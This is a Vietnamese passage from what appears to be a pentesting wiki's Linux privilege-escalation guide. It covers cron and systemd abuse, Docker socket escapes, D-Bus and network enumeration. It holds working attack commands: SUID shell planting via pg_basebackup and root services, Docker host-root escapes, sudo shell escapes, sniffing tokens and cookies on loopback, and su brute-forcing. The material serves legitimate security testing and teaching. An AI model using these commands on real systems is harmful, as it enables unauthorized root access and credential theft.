Bản thay thế chạy thành công được ký bằng vật liệu ký riêng tư bị leak, sử dụng một ELF signer. [Tài liệu định dạng](https://github.com/NUAA-WatchDog/linux-elf-binary-signer) mô tả một signature section được tạo từ `.text` của executable. Chỉ thêm certificate hoặc một chuỗi khớp vào `.text_sig` không được chứng minh là đủ để vượt qua verifier không được tiết lộ. Hãy kiểm tra đường dẫn thực tế được lên lịch, quyền ghi hiệu lực, lệnh gọi từ root và chính sách verifier trước khi kết luận rằng một binary có thể ghi và được ký là có thể khai thác. Bản thân section `.text_sig` chỉ là một manh mối cần xem xét.

### Các cron job chạy thường xuyên

Bạn có thể giám sát các tiến trình để tìm những tiến trình được thực thi mỗi 1, 2 hoặc 5 phút. Có thể bạn tận dụng được điều này để leo thang đặc quyền.

Ví dụ, để **giám sát mỗi 0.1 giây trong 1 phút**, **sắp xếp theo các lệnh được thực thi ít nhất** và xóa các lệnh được thực thi nhiều nhất, bạn có thể làm như sau:

```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```

**Bạn cũng có thể dùng** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (công cụ này sẽ theo dõi và liệt kê mọi process khởi chạy).

### Bản sao lưu của root giữ nguyên mode bit do attacker thiết lập (pg_basebackup)

Nếu cron do root sở hữu chạy `pg_basebackup` (hoặc bất kỳ thao tác sao chép đệ quy nào) trên một thư mục database mà bạn có thể ghi, bạn có thể đặt một **SUID/SGID binary** để nó được sao chép lại dưới quyền **root:root**, giữ nguyên các mode bit trong thư mục đầu ra của bản sao lưu.<sup>[[26]](#references)</sup>

Quy trình phát hiện thường gặp (với tư cách là người dùng DB có quyền thấp):
- Dùng `pspy` để phát hiện cron của root chạy lệnh kiểu như `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` mỗi phút.
- Xác nhận bạn có quyền ghi vào source cluster (ví dụ: `/var/lib/postgresql/14/main`) và thư mục đích (`/opt/backups/current`) thuộc sở hữu của root sau khi job chạy.

Khai thác:

```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```

Điều này hoạt động vì `pg_basebackup` giữ nguyên các bit quyền của file khi sao chép cluster; khi được root gọi, các file đích sẽ kế thừa **quyền sở hữu của root + SUID/SGID do attacker chọn**. Bất kỳ routine sao lưu/sao chép đặc quyền tương tự nào giữ nguyên quyền và ghi vào vị trí có thể thực thi đều dễ bị tấn công.

### Cron job ẩn

Có thể tạo cronjob **bằng cách thêm ký tự carriage return sau một comment** (không có ký tự xuống dòng), và cron job vẫn hoạt động. Ví dụ (lưu ý ký tự carriage return):

```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```

Để phát hiện kiểu mục nhập ẩn này, hãy kiểm tra các tệp cron bằng công cụ hiển thị ký tự điều khiển:

```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```

## Dịch vụ

### Có thể ghi vào các tệp _.service_

Kiểm tra xem bạn có thể ghi vào bất kỳ tệp `.service` nào không. Nếu có, bạn **có thể sửa đổi tệp đó** để **chạy** **backdoor của bạn khi** service được **khởi động**, **khởi động lại** hoặc **dừng** (có thể bạn sẽ cần đợi đến khi máy được khởi động lại).\
Ví dụ: tạo backdoor của bạn bên trong tệp .service bằng **`ExecStart=/tmp/script.sh`**

### Có thể ghi vào binary của service

Hãy nhớ rằng nếu bạn có **quyền ghi đối với các binary được service thực thi**, bạn có thể thay chúng bằng backdoor để khi service được thực thi lại, backdoor sẽ được chạy.

### PATH của systemd - Đường dẫn tương đối

Bạn có thể xem PATH mà **systemd** sử dụng bằng:

```bash
systemctl show-environment
```

Nếu phát hiện bạn có thể **ghi** vào bất kỳ thư mục nào trong đường dẫn, bạn có thể **leo thang đặc quyền**. Bạn cần tìm các **đường dẫn tương đối** được sử dụng trong các file cấu hình dịch vụ như:

```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```

Sau đó, tạo một **executable** có **cùng tên với binary theo đường dẫn tương đối** bên trong thư mục systemd PATH mà bạn có quyền ghi. Khi service được yêu cầu thực hiện hành động dễ bị khai thác (**Start**, **Stop**, **Reload**), **backdoor** của bạn sẽ được thực thi (người dùng không có đặc quyền thường không thể start/stop service, nhưng hãy kiểm tra xem bạn có thể dùng `sudo -l` không).

**Tìm hiểu thêm về service bằng lệnh `man systemd.service`.**

## **Timers**

**Timers** là các unit file của systemd có tên kết thúc bằng `**.timer**`, dùng để điều khiển các file `**.service**` hoặc sự kiện. **Timers** có thể được dùng thay cho cron vì chúng hỗ trợ sẵn các sự kiện thời gian theo lịch và các sự kiện thời gian đơn điệu, đồng thời có thể chạy bất đồng bộ.

Bạn có thể liệt kê tất cả các timer bằng lệnh:

```bash
systemctl list-timers --all
```

### Timer có thể ghi

Nếu bạn có thể sửa đổi một timer, bạn có thể khiến nó thực thi một số unit có sẵn của systemd.unit (chẳng hạn như `.service` hoặc `.target`)

```bash
Unit=backdoor.service
```

Trong tài liệu, bạn có thể đọc về Unit:

> Unit cần kích hoạt khi timer này hết hạn. Đối số là tên của một unit, không có hậu tố ".timer". Nếu không chỉ định, giá trị này mặc định là một service có cùng tên với timer unit, nhưng không có hậu tố. (Xem bên trên.) Khuyến nghị đặt tên unit được kích hoạt và tên timer unit giống nhau, ngoại trừ hậu tố.

Do đó, để lạm dụng quyền này, bạn cần:

- Tìm một systemd unit (chẳng hạn `.service`) **đang thực thi một binary có thể ghi được**
- Tìm một systemd unit **đang thực thi một đường dẫn tương đối**, đồng thời bạn có **quyền ghi** vào **systemd PATH** (để giả mạo executable đó)

**Tìm hiểu thêm về timer bằng `man systemd.timer`.**

### **Bật Timer**

Để bật timer, bạn cần quyền root và thực thi:

```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```

Lưu ý **timer** được **kích hoạt** bằng cách tạo symlink đến nó tại `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) cho phép **các tiến trình giao tiếp** với nhau trên cùng máy hoặc giữa các máy theo mô hình client-server. Chúng sử dụng các tệp descriptor Unix tiêu chuẩn để giao tiếp giữa các máy tính và được thiết lập thông qua các tệp `.socket`.<sup>[[14]](#references)</sup>

Có thể cấu hình sockets bằng các tệp `.socket`.

**Tìm hiểu thêm về sockets với `man systemd.socket`.** Trong tệp này, có thể cấu hình một số tham số đáng chú ý:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Các tùy chọn này khác nhau, nhưng nhìn chung dùng để **chỉ định nơi socket sẽ lắng nghe** (đường dẫn của tệp socket AF_UNIX, địa chỉ IPv4/6 và/hoặc số cổng cần lắng nghe, v.v.)
- `Accept`: Nhận một đối số boolean. Nếu **true**, một **service instance được khởi chạy cho mỗi kết nối đến** và chỉ socket kết nối được chuyển cho nó. Nếu **false**, tất cả listening socket sẽ được **chuyển cho service unit được khởi chạy**, và chỉ một service unit được khởi chạy để xử lý mọi kết nối. Giá trị này bị bỏ qua đối với datagram socket và FIFO, nơi một service unit duy nhất luôn xử lý toàn bộ lưu lượng đến. **Mặc định là false**. Vì lý do hiệu năng, nên chỉ viết daemon mới theo cách tương thích với `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Nhận một hoặc nhiều dòng lệnh, lần lượt được **thực thi trước** hoặc **sau khi** các **socket**/FIFO lắng nghe được **tạo** và liên kết. Từ đầu tiên trong dòng lệnh phải là tên tệp tuyệt đối, theo sau là các đối số dành cho tiến trình.
- `ExecStopPre`, `ExecStopPost`: Các **lệnh** bổ sung được **thực thi trước** hoặc **sau khi** các **socket**/FIFO lắng nghe được **đóng** và gỡ bỏ.
- `Service`: Chỉ định tên service unit **cần kích hoạt** khi có **lưu lượng đến**. Thiết lập này chỉ được phép với socket có `Accept=no`. Mặc định, tên service giống với tên socket (thay hậu tố). Trong hầu hết trường hợp, không cần dùng tùy chọn này.

### Tệp .socket có quyền ghi

Nếu tìm thấy tệp `.socket` **có quyền ghi**, bạn có thể **thêm** vào đầu phần `[Socket]` một dòng như: `ExecStartPre=/home/kali/sys/backdoor`; khi đó backdoor sẽ được thực thi trước khi socket được tạo. Vì vậy, bạn **có thể sẽ phải chờ máy khởi động lại.**\
_Lưu ý rằng hệ thống phải đang sử dụng cấu hình của tệp socket đó, nếu không backdoor sẽ không được thực thi_

### Socket activation + đường dẫn unit có quyền ghi (tạo service còn thiếu)

Một cấu hình sai có tác động lớn khác là:

- socket unit có `Accept=no` và `Service=<name>.service`
- service unit được tham chiếu không tồn tại
- kẻ tấn công có thể ghi vào `/etc/systemd/system` (hoặc một đường dẫn tìm kiếm unit khác)

Trong trường hợp đó, kẻ tấn công có thể tạo `<name>.service`, sau đó gửi lưu lượng đến socket để systemd tải và thực thi service mới với quyền root.

Luồng thực hiện nhanh:

```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```

### Socket có quyền ghi

Nếu bạn **phát hiện bất kỳ socket nào có quyền ghi** (_ở đây chúng ta đang nói về Unix Sockets, không phải các tệp `.socket` cấu hình_), thì **bạn có thể giao tiếp** với socket đó và có thể khai thác lỗ hổng.

### Liệt kê Unix Sockets

```bash
netstat -a -p --unix
```

### Kết nối thô

```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```

**Ví dụ khai thác:**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### Socket HTTP

Lưu ý rằng có thể có một số **socket đang lắng nghe** các yêu cầu HTTP (_ý tôi không nói đến các tệp .socket mà là các tệp hoạt động như socket unix_). Bạn có thể kiểm tra bằng cách:

```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```

Nếu socket **phản hồi bằng một** yêu cầu HTTP, thì bạn có thể **giao tiếp** với nó và có thể **khai thác một lỗ hổng**.

### Writable Docker Socket

Docker socket, thường nằm tại `/var/run/docker.sock`, là một tệp quan trọng cần được bảo vệ. Theo mặc định, người dùng `root` và thành viên nhóm `docker` có quyền ghi vào tệp này. Quyền ghi vào socket này có thể dẫn đến leo thang đặc quyền. Dưới đây là giải thích cách thực hiện và các phương pháp thay thế nếu không có Docker CLI.

#### **Leo thang đặc quyền bằng Docker CLI**

Nếu bạn có quyền ghi vào Docker socket, bạn có thể leo thang đặc quyền bằng các lệnh sau:<sup>[[15]](#references)</sup>

```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```

Các lệnh này cho phép bạn chạy container với quyền truy cập cấp root vào hệ thống tệp của host.

#### **Sử dụng trực tiếp Docker API**

Trong trường hợp không có Docker CLI, bạn vẫn có thể lạm dụng Docker socket bằng HTTP thô qua Unix socket. Quy trình đáng tin cậy nhất là:

- tạo một container helper chạy lâu dài với thư mục gốc của host được bind-mount
- khởi động nó
- tạo một phiên bản `exec` bên trong container helper đó
- khởi động phiên bản `exec` và đọc kết quả qua API

**Liệt kê các Docker image**

```bash
curl --unix-socket /var/run/docker.sock http://localhost/images/json
```

**Tạo và khởi động một container hỗ trợ**

```bash
HELPER=helper

curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine:3.20","Cmd":["sleep","99999"],"HostConfig":{"Binds":["/:/host"]}}' \
  "http://localhost/v1.47/containers/create?name=${HELPER}"

curl --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/v1.47/containers/${HELPER}/start"
```

**Tạo một instance exec**

```bash
EXEC_ID=$(
  curl -s --unix-socket /var/run/docker.sock \
    -H "Content-Type: application/json" \
    -d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-lc","find /host/root -maxdepth 1 -type f"]}' \
    "http://localhost/v1.47/containers/${HELPER}/exec" \
  | tr -d '\n' \
  | sed -n 's/.*"Id":"\([^"]*\)".*/\1/p'
)
```

**Khởi chạy instance exec và đọc đầu ra**

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Detach":false,"Tty":true}' \
  "http://localhost/v1.47/exec/${EXEC_ID}/start"
```

Mẫu này thường đáng tin cậy hơn so với việc cố gắng điều khiển `attach` thủ công bằng `socat` hoặc `nc -U`. Khi có thể tạo một helper với `/:/host`, bạn có thể dùng các phiên bản `exec` bổ sung để đọc những tệp như `/host/root/...`, thêm SSH key vào `/host/root/.ssh` hoặc chỉnh sửa các tệp khởi động của host.

### Khác

Lưu ý rằng nếu bạn có quyền ghi vào docker socket vì **bạn đang thuộc group `docker`**, thì bạn có [**nhiều cách khác để leo thang đặc quyền**](../../user-information/interesting-groups-linux-pe/index.html#docker-group). Nếu [**docker API đang lắng nghe trên một port**, bạn cũng có thể xâm phạm nó](../../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Xem **thêm các cách thoát khỏi container hoặc lạm dụng container runtime để leo thang đặc quyền** tại:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Leo thang đặc quyền bằng Containerd (ctr)

Nếu bạn thấy mình có thể sử dụng lệnh **`ctr`**, hãy đọc trang sau vì **bạn có thể lạm dụng nó để leo thang đặc quyền**:


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## Leo thang đặc quyền bằng **RunC**

Nếu bạn thấy mình có thể sử dụng lệnh **`runc`**, hãy đọc trang sau vì **bạn có thể lạm dụng nó để leo thang đặc quyền**:


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus là một **hệ thống giao tiếp liên tiến trình (IPC)** tinh vi, cho phép các ứng dụng tương tác và chia sẻ dữ liệu hiệu quả. Được thiết kế dành cho các hệ thống Linux hiện đại, nó cung cấp một framework mạnh mẽ cho nhiều hình thức giao tiếp giữa các ứng dụng.<sup>[[16]](#references)</sup>

Hệ thống này rất linh hoạt, hỗ trợ IPC cơ bản giúp tăng cường trao đổi dữ liệu giữa các tiến trình, tương tự như **UNIX domain socket được cải tiến**. Ngoài ra, nó còn hỗ trợ phát sự kiện hoặc tín hiệu, thúc đẩy sự tích hợp liền mạch giữa các thành phần hệ thống. Ví dụ: tín hiệu từ một daemon Bluetooth báo có cuộc gọi đến có thể khiến trình phát nhạc tắt tiếng, cải thiện trải nghiệm người dùng. D-Bus cũng hỗ trợ hệ thống đối tượng từ xa, giúp đơn giản hóa các yêu cầu dịch vụ và lời gọi phương thức giữa các ứng dụng, tinh giản những quy trình vốn phức tạp.

D-Bus hoạt động theo **mô hình cho phép/từ chối**, quản lý quyền đối với thông điệp (lời gọi phương thức, phát tín hiệu, v.v.) dựa trên tác động tổng hợp của các quy tắc chính sách khớp. Những chính sách này quy định các tương tác với bus và có thể tạo điều kiện leo thang đặc quyền thông qua việc khai thác các quyền đó.

Ví dụ về một chính sách như vậy trong `/etc/dbus-1/system.d/wpa_supplicant.conf` được cung cấp bên dưới, mô tả quyền của người dùng root trong việc sở hữu, gửi thông điệp đến và nhận thông điệp từ `fi.w1.wpa_supplicant1`.

Các chính sách không chỉ định người dùng hoặc group sẽ áp dụng cho tất cả mọi người, trong khi các chính sách trong ngữ cảnh "default" áp dụng cho mọi trường hợp không được bao phủ bởi các chính sách cụ thể khác.

```xml
<policy user="root">
    <allow own="fi.w1.wpa_supplicant1"/>
    <allow send_destination="fi.w1.wpa_supplicant1"/>
    <allow send_interface="fi.w1.wpa_supplicant1"/>
    <allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```

**Tìm hiểu cách enumerate và exploit giao tiếp D-Bus tại đây:**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Mạng**

Luôn hữu ích khi enumerate mạng và xác định vị trí của máy.

### Enumerate tổng quát

```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```

Nếu một mục đang hoạt động trong `/etc/inetd.conf` chạy GNU Inetutils `telnetd` với quyền root, hãy kiểm tra phiên bản binary được cấu hình và listener cục bộ, kể cả khi cổng chỉ bind vào loopback. GNU Inetutils từ phiên bản 1.9.3 đến 2.7 có [lỗ hổng bypass xác thực Telnet](https://seclists.org/oss-sec/2026/q1/89), trong đó `USER` do client cung cấp được chuyển tới `login -f` (CVE-2026-24061). Tiến trình hoặc chuỗi phiên bản chỉ là dấu hiệu; hãy xác nhận trạng thái bản vá của nhà cung cấp và daemon thực tế trước khi kết luận hệ thống bị lộ. [Hướng dẫn Telnet](../../../network-services-pentesting/pentesting-telnet.md) có thêm chi tiết.

### Phân loại nhanh bộ lọc outbound

Nếu host chạy được lệnh nhưng callback thất bại, hãy nhanh chóng phân biệt việc lọc DNS, transport, proxy và route:

```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```

### Các cổng đang mở

Luôn kiểm tra các dịch vụ mạng đang chạy trên máy mà bạn chưa thể tương tác trước khi truy cập máy đó:

```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```

Phân loại các listener theo địa chỉ bind:

- `0.0.0.0` / `[::]`: lắng nghe trên mọi interface cục bộ.
- `127.0.0.1` / `::1`: chỉ cục bộ (các ứng viên phù hợp để tunnel/forward).
- Các IP nội bộ cụ thể (ví dụ: `10.x`, `172.16/12`, `192.168.x`, `fe80::`): thường chỉ có thể truy cập từ các phân đoạn mạng nội bộ.

### Quy trình kiểm tra nhanh service chỉ cục bộ

Khi chiếm được một host, các service bind với `127.0.0.1` thường lần đầu tiên có thể truy cập được từ shell của bạn. Quy trình cục bộ nhanh như sau:

```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```

### LinPEAS như một trình quét mạng (chế độ chỉ quét mạng)

Ngoài các bước kiểm tra PE cục bộ, linPEAS có thể chạy như một trình quét mạng chuyên dụng. Nó sử dụng các binary có sẵn trong `$PATH` (thường là `fping`, `ping`, `nc`, `ncat`) và không cài đặt công cụ.

```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```

Nếu bạn dùng `-d`, `-p` hoặc `-i` mà không có `-t`, linPEAS sẽ hoạt động như một trình quét mạng thuần túy (bỏ qua các bước kiểm tra leo thang đặc quyền còn lại).

### Nghe lén

Kiểm tra xem bạn có thể nghe lén lưu lượng mạng hay không. Nếu có, bạn có thể lấy được một số thông tin đăng nhập.

```
timeout 1 tcpdump
```

Các bước kiểm tra thực tế nhanh:

```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```

Loopback (`lo`) đặc biệt có giá trị trong post-exploitation vì nhiều dịch vụ chỉ dành cho nội bộ làm lộ tokens/cookies/credentials tại đó:

```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
  | egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```

Thu thập ngay, phân tích cú pháp sau:

```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
  -T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```

## Người dùng

### Liệt kê chung

Kiểm tra bạn là **ai**, bạn có những **quyền hạn** nào, hệ thống có những **người dùng** nào, những ai có thể **login** và những ai có **quyền root:**

```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```

### UID lớn

Một số phiên bản Linux bị ảnh hưởng bởi lỗi cho phép người dùng có **UID > INT_MAX** leo thang đặc quyền. Tìm hiểu thêm: [tại đây](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [tại đây](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) và [tại đây](https://twitter.com/paragonsec/status/1071152249529884674).<sup>[[33]](#references)[[34]](#references)[[35]](#references)</sup>\
**Khai thác lỗi này** bằng: **`systemd-run -t /bin/bash`**

### Nhóm

Kiểm tra xem bạn có phải là **thành viên của nhóm nào** có thể cấp cho bạn quyền root hay không:


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### Clipboard

Kiểm tra xem clipboard có chứa thông tin nào đáng chú ý không (nếu có thể)

```bash
if [ `which xclip 2>/dev/null` ]; then
    echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
    echo "Highlighted text: "`xclip -o 2>/dev/null`
  elif [ `which xsel 2>/dev/null` ]; then
    echo "Clipboard: "`xsel -ob 2>/dev/null`
    echo "Highlighted text: "`xsel -o 2>/dev/null`
  else echo "Not found xsel and xclip"
  fi
```

### Chính sách mật khẩu

```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```

### Mật khẩu đã biết

Nếu bạn **biết bất kỳ mật khẩu nào** trong môi trường, **hãy thử đăng nhập bằng mật khẩu đó với từng người dùng**.

### Su Brute

Nếu bạn không ngại gây nhiều tiếng ồn và máy tính có các binary `su` và `timeout`, bạn có thể thử brute-force người dùng bằng [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) với tham số `-a` cũng thử brute-force người dùng.

## Lạm dụng PATH có quyền ghi

### $PATH

Nếu bạn phát hiện mình có thể **ghi vào một thư mục nào đó trong $PATH**, bạn có thể leo thang đặc quyền bằng cách **tạo backdoor trong thư mục có quyền ghi** với tên của một lệnh sẽ được người dùng khác (lý tưởng nhất là root) thực thi, đồng thời lệnh đó **không được tải từ thư mục nào nằm trước thư mục có quyền ghi trong $PATH**.

### SUDO và SUID

Bạn có thể được phép thực thi một số lệnh bằng sudo, hoặc chúng có thể có bit suid. Kiểm tra bằng:

```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```

Một số **lệnh không ngờ tới cho phép bạn đọc và/hoặc ghi tệp, thậm chí thực thi lệnh**.<sup>[[8]](#references)</sup> Ví dụ:

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```

### NOPASSWD

Cấu hình Sudo có thể cho phép người dùng thực thi một số lệnh với quyền của người dùng khác mà không cần biết mật khẩu.

```
$ sudo -l
User demo may run the following commands on crashlab:
    (root) NOPASSWD: /usr/bin/vim
```

Trong ví dụ này, người dùng demo có thể chạy vim với quyền root; giờ đây rất dễ lấy được shell bằng cách thêm SSH key vào thư mục root hoặc gọi sh.

```
sudo vim -c '!sh'
```

### So sánh Bash không đặt trong dấu ngoặc kép trong script sudo

Trong Bash, vế phải của `[[ "$protected" == $candidate ]]` là một pattern. Nếu một script sudo có khả năng chạy với quyền root gán `candidate` từ một tệp do người gọi kiểm soát, một giá trị như `prefix*` có thể khớp với phần đầu của chuỗi được bảo vệ. Các nhánh xử lý thành công và lỗi khác nhau sau đó có thể làm lộ một prefix oracle. Hãy đặt vế phải trong dấu ngoặc kép (`[[ "$protected" == "$candidate" ]]`) khi muốn so sánh chính xác. Hãy kiểm tra các đối số sudo thực tế, nguồn gốc đầu vào và hành vi có thể quan sát của các nhánh trước khi kết luận rằng phép so sánh không đặt trong dấu ngoặc kép có thể bị khai thác. [Tài liệu hướng dẫn GNU Bash](https://www.gnu.org/software/bash/manual/html_node/Conditional-Constructs.html) mô tả hành vi của pattern này.

### Tệp dự án PrusaSlicer khi chạy bằng sudo

Cần xem xét kỹ một quyền sudo không hạn chế cho `prusaslicer` hoặc `prusa-slicer` có khả năng chạy với quyền root nếu người gọi có thể chọn dự án `.3mf` để cắt lớp. Một dự án có thể chứa script hậu xử lý chạy khi xuất G-code; các dự án được tạo có chủ đích có thể thực thi lệnh trong PrusaSlicer đến phiên bản 2.6.1 ([CVE-2023-47268](https://security-tracker.debian.org/tracker/CVE-2023-47268)). Trước khi kết luận rằng có thể vượt qua ranh giới đặc quyền, hãy xác nhận quy tắc sudo có hiệu lực, phiên bản binary và các bản vá từ nhà cung cấp, nguồn dự án và liệu đường dẫn xuất liên quan có được thực thi hay không. Đối số dự án cố định hoặc chính sách `NOEXEC` có hiệu lực có thể làm thay đổi kết quả. Chỉ phát hiện slicer đã được cài đặt không đủ để xác định có đường dẫn nâng quyền hay không.

### SETENV

Chỉ thị này cho phép người dùng **đặt một biến môi trường** khi thực thi một lệnh:

```bash
$ sudo -l
User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

Ví dụ này, **dựa trên máy HTB Admirer**, **dễ bị** **PYTHONPATH hijacking** để tải một thư viện Python tùy ý khi thực thi script với quyền root:

```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```

### Đầu độc `__pycache__` / `.pyc` có quyền ghi trong các module Python được phép chạy bằng sudo

Nếu một **script Python được phép chạy bằng sudo** import một module có thư mục package chứa `__pycache__` **có quyền ghi**, bạn có thể thay thế `.pyc` đã cache và thực thi mã với quyền của người dùng đặc quyền ở lần import tiếp theo.<sup>[[30]](#references)</sup>

- Vì sao cách này hiệu quả:
  - CPython lưu bytecode cache trong `__pycache__/module.cpython-<ver>.pyc`.<sup>[[31]](#references)</sup>
  - Trình thông dịch xác thực **header** (magic + metadata timestamp/hash gắn với source), sau đó thực thi code object đã marshal nằm sau header đó.
